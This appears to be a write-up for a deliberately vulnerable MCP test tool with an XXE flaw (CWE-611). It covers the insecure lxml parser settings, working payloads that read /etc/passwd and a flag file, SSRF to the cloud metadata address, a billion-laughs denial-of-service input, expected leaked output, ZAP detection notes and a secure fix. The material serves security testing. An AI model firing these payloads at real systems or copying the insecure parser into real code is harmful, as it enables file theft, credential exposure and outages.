# XML External Entity Injection — CWE-611

## Description

The XML parser is configured with external entity resolution and DTD loading enabled.
An attacker can embed a DOCTYPE declaration with an external entity reference to:
- Read arbitrary local files
- Trigger SSRF requests from the server
- Cause denial of service via recursive entity expansion ("billion laughs")

## Vulnerable Code

```python
# tools/xxe.py
parser = etree.XMLParser(
    resolve_entities=True,   # expands &entity; references
    load_dtd=True,           # loads DOCTYPE DTDs including external subsets
    no_network=False,        # allows network fetches for SYSTEM entities
)
root = etree.fromstring(xml_content.encode(), parser)
```

Python's stdlib `xml.etree.ElementTree` does not support external entities (safe by default),
so `lxml` is used here with dangerous options deliberately enabled.

## Example MCP Call (benign)

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "parse_xml",
    "arguments": {"xml_content": "<root><item>hello</item></root>"}
  },
  "id": 1
}
```

## Attack Payloads

### Read /etc/passwd
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>
```

### Read the application flag
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///app/flag.txt">]>
<root>&x;</root>
```

### SSRF via entity (inside cloud environment)
```xml
<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&x;</root>
```

### Billion laughs (DoS via entity expansion)
```xml
<!DOCTYPE lolz [
  <!ENTITY a "lol">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<root>&c;</root>
```

## Expected Response (passwd read)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## ZAP Detection

ZAP's XXE active scanner should detect:
- Response body contains `/etc/passwd` content
- Response body contains ZAP's OOB callback URL response (if using OAST)
- Error messages referencing external URIs

## Secure Fix

Use a restricted parser that disables all external entity loading:

```python
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    load_dtd=False,
    no_network=True,
)
```

Or use Python's stdlib `xml.etree.ElementTree` which is safe by default (since Python 3.8).
